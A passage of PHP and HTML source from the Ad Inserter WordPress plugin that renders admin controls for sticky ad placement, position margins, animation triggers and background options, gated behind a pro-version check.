        $onclick = 'onclick="if (confirm(\'' . sprintf (__('%s license overused. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
      }
      elseif ($ai_status == - 22) {
                                                        // translators: %s: Ad Inserter Pro
        $onclick = 'onclick="if (confirm(\'' . sprintf (__('Invalid %s version. Continue?', 'ad-inserter'), AD_INSERTER_NAME) . '\')) return true; return false"';
      }
    }
  }

?>
          <input <?php echo $onclick; ?> style="display: none; vertical-align: middle; font-weight: bold;" name="<?php echo AI_FORM_SAVE; ?>" value="<?php echo __('Save Settings', 'ad-inserter'), ' ', $start, ' - ', $end; ?>" type="submit" />
<?php
}

function ai_style_options ($obj) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) : ?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky" value="<?php echo AI_ALIGNMENT_STICKY; ?>" data-title="<?php echo AI_TEXT_STICKY; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY; ?></option>
<?php else : ?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-left" value="<?php echo AI_ALIGNMENT_STICKY_LEFT; ?>" data-title="<?php echo AI_TEXT_STICKY_LEFT; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_LEFT; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-right" value="<?php echo AI_ALIGNMENT_STICKY_RIGHT; ?>" data-title="<?php echo AI_TEXT_NO_WRAPPING; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_RIGHT; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-top" value="<?php echo AI_ALIGNMENT_STICKY_TOP; ?>" data-title="<?php echo AI_TEXT_STICKY_RIGHT; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_TOP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_TOP; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-bottom" value="<?php echo AI_ALIGNMENT_STICKY_BOTTOM; ?>" data-title="<?php echo AI_TEXT_STICKY_BOTTOM; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY_BOTTOM) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_BOTTOM; ?></option>
<?php endif;
}

function ai_style_css ($block, $obj) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) : ?>
          <span id="css-sticky-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding: 0 7px 0px 0px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY, false, false); ?><span class="ai-sticky-css"><?php echo $obj->sticky_style ($obj->get_horizontal_position (), $obj->get_vertical_position ()); ?></span></span>
<?php else : ?>
          <span id="css-sticky-left-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-left: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_LEFT); ?></span>
          <span id="css-sticky-right-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-right: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_RIGHT); ?></span>
          <span id="css-sticky-top-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-left: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_TOP); ?></span>
          <span id="css-sticky-bottom-<?php echo $block; ?>" class='css-code-<?php echo $block; ?>' style="height: 18px; padding-right: 7px; display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_BOTTOM); ?></span>
<?php endif;
}

function ai_preview_style_options ($obj, $alignment_type, $sticky = false) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
    if ($sticky) { ?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY; ?>" data-title="<?php echo AI_TEXT_STICKY; ?>" <?php echo ($obj->get_alignment_type() == AI_ALIGNMENT_STICKY) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY; ?></option>
<?php
    }
  } else {
?>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-left" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_LEFT, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_LEFT; ?>" data-title="<?php echo AI_TEXT_STICKY_LEFT; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_LEFT; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-right" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_RIGHT, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_RIGHT; ?>" data-title="<?php echo AI_TEXT_STICKY_RIGHT; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_RIGHT; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-top" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_TOP, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_TOP; ?>" data-title="<?php echo AI_TEXT_STICKY_TOP; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_TOP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_TOP; ?></option>
         <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion preview im-sticky-bottom" <?php alt_styles_data ($obj->alignment_style (AI_ALIGNMENT_STICKY_BOTTOM, true)); ?> value="<?php echo AI_ALIGNMENT_STICKY_BOTTOM; ?>" data-title="<?php echo AI_TEXT_STICKY_BOTTOM; ?>" <?php echo ($alignment_type == AI_ALIGNMENT_STICKY_BOTTOM) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICKY_BOTTOM; ?></option>
<?php
  }
}

function ai_preview_style_css ($obj, $horizontal_position = null, $vertical_position = null, $horizontal_margin = null, $vertical_margin = null) {
  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) : ?>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY, false, false); ?><span class="ai-sticky-css"><?php echo $obj->sticky_style ($horizontal_position, $vertical_position, $horizontal_margin, $vertical_margin); ?></span></span>
<?php else : ?>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_LEFT; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_LEFT); ?></span>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_RIGHT; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_RIGHT); ?></span>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_TOP; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_TOP); ?></span>
            <span id="css-<?php echo AI_ALIGNMENT_STICKY_BOTTOM; ?>" class="css-code" style="vertical-align: middle;display: none;" title="CSS code for wrapping div, click to edit"><?php echo $obj->alignment_style (AI_ALIGNMENT_STICKY_BOTTOM); ?></span>
<?php endif;
}

function ai_sticky_positions ($block, $obj, $default) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
    $horizontal_position = $obj->get_horizontal_position();
    $vertical_position   = $obj->get_vertical_position();
?>
      <div id="sticky-position-<?php echo $block; ?>" <?php echo $obj->get_background () ? 'class="ai-background" ' : ''; ?>style="margin: 8px 0; display: none;">
        <div style="float: left;">
          <?php _e ('Horizontal position', 'ad-inserter'); ?>
          <select class="ai-image-selection" id="horizontal-position-<?php echo $block; ?>" name="<?php echo AI_OPTION_HORIZONTAL_POSITION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_horizontal_position(); ?>" style="margin-top: -1px; width: auto;">
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-left"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_LEFT; ?>" data-css-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_LEFT_BKG; ?>"
               value="<?php echo AI_STICK_TO_THE_LEFT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_LEFT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_LEFT; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-content-left"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_CONTENT_LEFT; ?>" data-css-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_CONTENT_LEFT_BKG; ?>"
               value="<?php echo AI_STICK_TO_THE_CONTENT_LEFT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_CONTENT_LEFT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_CONTENT_LEFT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_CONTENT_LEFT; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-center-horizontal"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_CENTER_HORIZONTAL; ?>"
               data-css-<?php echo AI_STICK_VERTICAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_CENTER_HORIZONTAL_V; ?>"
               data-css-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_CENTER_HORIZONTAL_BKG; ?>"
               value="<?php echo AI_STICK_HORIZONTAL_CENTER; ?>"
               data-title="<?php echo AI_TEXT_CENTER; ?>" <?php echo ($horizontal_position == AI_STICK_HORIZONTAL_CENTER) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_POSITION_CENTER; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-content-right"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_CONTENT_RIGHT; ?>" data-css-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_CONTENT_RIGHT_BKG; ?>"
               value="<?php echo AI_STICK_TO_THE_CONTENT_RIGHT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_CONTENT_RIGHT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_CONTENT_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_CONTENT_RIGHT; ?></option>
             <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-right"
               data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_RIGHT; ?>" data-css-<?php echo AI_SCROLL_WITH_THE_CONTENT; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_RIGHT_SCROLL; ?>" data-css-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_RIGHT_BKG; ?>"
               value="<?php echo AI_STICK_TO_THE_RIGHT; ?>"
               data-title="<?php echo AI_TEXT_STICK_TO_THE_RIGHT; ?>" <?php echo ($horizontal_position == AI_STICK_TO_THE_RIGHT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_RIGHT; ?></option>
          </select>
          <input type="text" id="horizontal-margin-<?php echo $block; ?>" style="width: 46px;" name="<?php echo AI_OPTION_HORIZONTAL_MARGIN, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_horizontal_margin (); ?>" value="<?php echo $obj->get_horizontal_margin (); ?>" size="5" maxlength="5" title="<?php _e ('Horizontal margin from the content or screen edge, empty means default value from CSS', 'ad-inserter'); ?>" /> px
          <div style="clear: both;"></div>

          <div id="horizontal-positions-<?php echo $block; ?>"></div>
        </div>

        <div style="float: right;">
          <div style="text-align: right;">
            <?php _e ('Vertical position', 'ad-inserter'); ?>
            <select id="vertical-position-<?php echo $block; ?>" name="<?php echo AI_OPTION_VERTICAL_POSITION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_vertical_position(); ?>" style="margin-top: -1px; width: auto;" data-css-body-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_TOP; ?>">
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-top"
                data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_TOP_OFFSET; ?>" data-css-<?php echo AI_STICK_HORIZONTAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_TOP; ?>" data-css-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_TOP; ?>"
                value="<?php echo AI_STICK_TO_THE_TOP; ?>" data-title="<?php echo AI_TEXT_STICK_TO_THE_TOP; ?>" <?php echo ($vertical_position == AI_STICK_TO_THE_TOP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_TOP; ?></option>
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-center-vertical"
                 data-css="<?php echo AI_ALIGNMENT_CSS_CENTER_VERTICAL; ?>" data-css-<?php echo AI_STICK_HORIZONTAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_CENTER_VERTICAL_H_ANIM; ?>"
                 value="<?php echo AI_STICK_VERTICAL_CENTER; ?>" data-title="<?php echo AI_TEXT_CENTER; ?>" <?php echo ($vertical_position == AI_STICK_VERTICAL_CENTER) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_POSITION_CENTER; ?></option>
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-scroll"
                 data-css="<?php echo AI_ALIGNMENT_CSS_SCROLL_WITH_THE_CONTENT; ?>" data-css-bkg="<?php echo AI_ALIGNMENT_CSS_SCROLL_WITH_THE_CONTENT_BKG; ?>"
                 value="<?php echo AI_SCROLL_WITH_THE_CONTENT; ?>" data-title="<?php echo AI_TEXT_SCROLL_WITH_THE_CONTENT; ?>" <?php echo ($vertical_position == AI_SCROLL_WITH_THE_CONTENT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SCROLL_WITH_THE_CONTENT; ?></option>
               <option data-img-src="<?php echo plugins_url ('css/images/blank.png', AD_INSERTER_FILE); ?>" data-img-class="automatic-insertion im-sticky-bottom"
                 data-css="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_BOTTOM_OFFSET; ?>" data-css-<?php echo AI_STICK_HORIZONTAL_CENTER; ?>="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_BOTTOM; ?>" data-css-bkg="<?php echo AI_ALIGNMENT_CSS_STICK_TO_THE_BOTTOM; ?>"
                 value="<?php echo AI_STICK_TO_THE_BOTTOM; ?>" data-title="<?php echo AI_TEXT_STICK_TO_THE_BOTTOM; ?>" <?php echo ($vertical_position == AI_STICK_TO_THE_BOTTOM) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STICK_TO_THE_BOTTOM; ?></option>
            </select>
            <input type="text" id="vertical-margin-<?php echo $block; ?>" style="width: 46px;" name="<?php echo AI_OPTION_VERTICAL_MARGIN, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_vertical_margin (); ?>" value="<?php echo $obj->get_vertical_margin (); ?>" size="5" maxlength="5" title="<?php _e ('Vertical margin from the top or bottom screen edge, empty means default value from CSS', 'ad-inserter'); ?>" /> px
            <div style="clear: both;"></div>
          </div>

          <div id="vertical-positions-<?php echo $block; ?>" style="float: right;"></div>
        </div>

        <div style="clear: both;"></div>
      </div>
<?php
  }
}

function ai_sticky_animation ($block, $obj, $default) {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (defined ('AI_STICKY_SETTINGS') && AI_STICKY_SETTINGS) {
    $animation              = $obj->get_animation ();
    $animation_trigger      = $obj->get_animation_trigger ();
    $animation_out_trigger  = $obj->get_animation_out_trigger ();

    $close_button           = $obj->get_close_button ();
    $default_close_button   = $default->get_close_button ();

    $background_repeat      = $obj->get_background_repeat ();
    $background_size        = $obj->get_background_size ();

?>
        <div id="sticky-animation-<?php echo $block; ?>" class="ai-rounded sticky-animation" style="display: none;">
          <div class="max-input" style="margin: 0;">
            <span style="display: table-cell; width: 90%;">
              <?php _e ('Animation', 'ad-inserter'); ?>
              <select id="animation-<?php echo $block; ?>" name="<?php echo AI_OPTION_ANIMATION, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation (); ?>">
                 <option value="<?php echo AI_ANIMATION_NONE; ?>" <?php echo ($animation  == AI_ANIMATION_NONE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_NONE; ?></option>
                 <option value="<?php echo AI_ANIMATION_FADE; ?>" <?php echo ($animation  == AI_ANIMATION_FADE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_FADE; ?></option>
                 <option value="<?php echo AI_ANIMATION_SLIDE; ?>" <?php echo ($animation  == AI_ANIMATION_SLIDE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SLIDE; ?></option>
                 <option value="<?php echo AI_ANIMATION_SLIDE_FADE; ?>" <?php echo ($animation  == AI_ANIMATION_SLIDE_FADE) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_SLIDE_FADE; ?></option>
                 <option value="<?php echo AI_ANIMATION_TURN; ?>" <?php echo ($animation  == AI_ANIMATION_TURN) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_TURN; ?></option>
                 <option value="<?php echo AI_ANIMATION_FLIP; ?>" <?php echo ($animation  == AI_ANIMATION_FLIP) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_FLIP; ?></option>
                 <option value="<?php echo AI_ANIMATION_ZOOM_IN; ?>" <?php echo ($animation  == AI_ANIMATION_ZOOM_IN) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ZOOM_IN; ?></option>
                 <option value="<?php echo AI_ANIMATION_ZOOM_OUT; ?>" <?php echo ($animation  == AI_ANIMATION_ZOOM_OUT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ZOOM_OUT; ?></option>
              </select>
            </span>

<?php if (function_exists ('ai_display_close')) ai_display_close ($block, $obj, $default, 'close-button-sticky-'.$block, '', ' margin-left: 20px;'); ?>

          </div>

          <div class="max-input animation-parameters" style="margin: 8px 0 0 0;<?php echo $animation == AI_ANIMATION_NONE || ($obj->get_background ()) ? ' display: none;' : ''?>">
            <span style="display: table-cell; min-width: 40px;white-space: nowrap;">
              <?php _e ('Show', 'ad-inserter'); ?>
            </span>
            <span style="display: table-cell; width: 1px; white-space: nowrap;">
              <select name="<?php echo AI_OPTION_ANIMATION_TRIGGER, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger (); ?>" style="margin-top: -1px;">
                 <option value="<?php echo AI_TRIGGER_PAGE_LOADED; ?>" <?php echo ($animation_trigger == AI_TRIGGER_PAGE_LOADED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_LOADED; ?></option>
                 <option value="<?php echo AI_TRIGGER_PAGE_SCROLLED_PC; ?>" <?php echo ($animation_trigger == AI_TRIGGER_PAGE_SCROLLED_PC) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_SCROLLED_PC; ?></option>
                 <option value="<?php echo AI_TRIGGER_PAGE_SCROLLED_PX; ?>" <?php echo ($animation_trigger == AI_TRIGGER_PAGE_SCROLLED_PX) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_SCROLLED_PX; ?></option>
                 <option value="<?php echo AI_TRIGGER_ELEMENT_SCROLLS_IN; ?>" <?php echo ($animation_trigger == AI_TRIGGER_ELEMENT_SCROLLS_IN) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ELEMENT_SCROLLS_IN; ?></option>
                 <option value="<?php echo AI_TRIGGER_ELEMENT_SCROLLS_OUT; ?>" <?php echo ($animation_trigger == AI_TRIGGER_ELEMENT_SCROLLS_OUT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ELEMENT_SCROLLS_OUT; ?></option>
              </select>
            </span>
            <span style="display: table-cell; padding-right: 10px; width: 40%;">
              <input type="text" id="trigger-value-<?php echo $block; ?>" style="width: 95%;" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_VALUE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger_value (); ?>" value="<?php echo $obj->get_animation_trigger_value (); ?>" maxlength="60" title="<?php _e ('Trigger value: page scroll in %, page scroll in px or element with selector (#id or .class) scrolls in or out of screen', 'ad-inserter'); ?>" />
            </span>

            <span style="display: table-cell; white-space: nowrap; padding-right: 10px;">
              <?php _e ('Offset', 'ad-inserter'); ?> <input type="text" id="trigger-offset-<?php echo $block; ?>" style="width: 62px;" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_OFFSET, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger_offset (); ?>" value="<?php echo $obj->get_animation_trigger_offset (); ?>" size="4" maxlength="5" title="<?php _e ('Offset of trigger element', 'ad-inserter'); ?>" /> px
            </span>

            <span style="display: table-cell; white-space: nowrap; padding-right: 10px;">
              <?php _e ('Delay', 'ad-inserter'); ?> <input type="text" id="trigger-delay-<?php echo $block; ?>" style="width: 62px;" name="<?php echo AI_OPTION_ANIMATION_TRIGGER_DELAY, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_trigger_delay (); ?>" value="<?php echo $obj->get_animation_trigger_delay (); ?>" size="4" maxlength="5" title="<?php _e ('Delay animation after trigger condition', 'ad-inserter'); ?>" /> ms
            </span>
          </div>

          <div class="max-input animation-parameters" style="margin: 8px 0 0 0;<?php echo $animation == AI_ANIMATION_NONE || ($obj->get_background ()) ? ' display: none;' : ''?>">
            <span style="display: table-cell; min-width: 40px;white-space: nowrap;">
              <?php _e ('Hide', 'ad-inserter'); ?>
            </span>
            <span style="display: table-cell; width: 1px; white-space: nowrap;">
              <select name="<?php echo AI_OPTION_ANIMATION_OUT_TRIGGER, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_out_trigger (); ?>" style="margin-top: -1px;">
                 <option value="<?php echo AI_TRIGGER_DISABLED; ?>" <?php echo ($animation_out_trigger == AI_TRIGGER_DISABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_DISABLED; ?></option>
                 <option value="<?php echo AI_TRIGGER_ENABLED; ?>" <?php echo ($animation_out_trigger == AI_TRIGGER_ENABLED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ENABLED; ?></option>
                 <option value="<?php echo AI_TRIGGER_PAGE_SCROLLED_PC; ?>" <?php echo ($animation_out_trigger == AI_TRIGGER_PAGE_SCROLLED_PC) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_SCROLLED_PC; ?></option>
                 <option value="<?php echo AI_TRIGGER_PAGE_SCROLLED_PX; ?>" <?php echo ($animation_out_trigger == AI_TRIGGER_PAGE_SCROLLED_PX) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_PAGE_SCROLLED_PX; ?></option>
                 <option value="<?php echo AI_TRIGGER_ELEMENT_SCROLLS_IN; ?>" <?php echo ($animation_out_trigger == AI_TRIGGER_ELEMENT_SCROLLS_IN) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ELEMENT_SCROLLS_IN; ?></option>
                 <option value="<?php echo AI_TRIGGER_ELEMENT_SCROLLS_OUT; ?>" <?php echo ($animation_out_trigger == AI_TRIGGER_ELEMENT_SCROLLS_OUT) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ELEMENT_SCROLLS_OUT; ?></option>
              </select>
            </span>
            <span style="display: table-cell; padding-right: 10px; width: 40%;">
              <input type="text" id="out-trigger-value-<?php echo $block; ?>" style="width: 95%;" name="<?php echo AI_OPTION_ANIMATION_OUT_TRIGGER_VALUE, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_out_trigger_value (); ?>" value="<?php echo $obj->get_animation_out_trigger_value (); ?>" maxlength="60" title="<?php _e ('Trigger value: page scroll in %, page scroll in px or element with selector (#id or .class) scrolls in or out of screen', 'ad-inserter'); ?>" />
            </span>

            <span style="display: table-cell; white-space: nowrap; padding-right: 10px;">
              <?php _e ('Offset', 'ad-inserter'); ?> <input type="text" id="out-trigger-offset-<?php echo $block; ?>" style="width: 62px;" name="<?php echo AI_OPTION_ANIMATION_OUT_TRIGGER_OFFSET, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_animation_out_trigger_offset (); ?>" value="<?php echo $obj->get_animation_out_trigger_offset (); ?>" size="4" maxlength="5" title="<?php _e ('Offset of trigger element', 'ad-inserter'); ?>" /> px
            </span>

            <span style="display: table-cell; white-space: nowrap; padding-right: 10px; visibility: hidden;">
              <?php _e ('Delay', 'ad-inserter'); ?> <input type="text" style="width: 62px;" value="" size="4" maxlength="5" /> ms
            </span>
          </div>
        </div>

        <div id="sticky-background-<?php echo $block; ?>" class="ai-rounded" style="display: none;">
          <div class="max-input" style="margin: 0;">
            <span style="display: table-cell; white-space: nowrap; margin-top: 2px; float: left;">
              <input type="hidden" name="<?php echo AI_OPTION_BACKGROUND, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
              <input style="" id="background-<?php echo $block; ?>" type="checkbox" name="<?php echo AI_OPTION_BACKGROUND, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo $default->get_background (); ?>" <?php if ($obj->get_background () == AI_ENABLED) echo 'checked '; ?> />
              <label for="background-<?php echo $block; ?>"><?php _e ('Background', 'ad-inserter'); ?></label>
            </span>

<?php if (get_output_buffering ()): ?>
            <span class="bkg-parameters" style="display: table-cell; white-space: nowrap; margin-top: 2px; float: right;">
              <input type="hidden" name="<?php echo AI_OPTION_SET_BODY_BACKGROUND, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
